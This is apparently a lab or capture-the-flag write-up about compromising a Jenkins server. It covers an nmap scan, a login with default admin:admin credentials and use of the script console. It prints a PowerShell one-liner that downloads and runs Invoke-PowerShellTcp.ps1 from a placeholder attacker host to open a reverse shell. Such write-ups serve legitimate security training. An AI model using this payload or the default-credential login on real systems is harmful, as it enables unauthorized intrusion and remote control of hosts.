
# First Section

Used nmap to discover open TCP and UDP ports, and to see what machine it was (OS), giving the answer of how many TCP ports are opened:

SCREEN01

nmap discovered 3 ports. 
Port 80 is the website hosted on the host, 8080 is the port to access Jenkins’s instance. 
I researched the default credentials for Jenkins, tried those and was successful to get in the Web GUI of Jenkins (admin:admin) and to the script console Jenkins page where we want to insert the Powershell command we will mention later.

SCREEN02 SCREEN03

Now we need to establish a tunnel between my machine and the host. On the machine, we need to use netcat to create a listener and we need to create a socket for HTTP server. On the Jenkins host, we need to use this command to get the reverse shell on your machine and then run it: *powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port*

Before I get Jenkins to execute this command, I must start a Python HTTP server on my AttackBox that will serve the *Invoke-PowerShellTcp.ps1* script. I did this with the following command that is on a working directory with *Invoke-PowerShellTcp.ps1* PowerShell script:

SCREEN04

I also setup a reverse netcat listener on my AttackBox with the following command to listen in for the PowerShell reverse shell:

SCREEN05
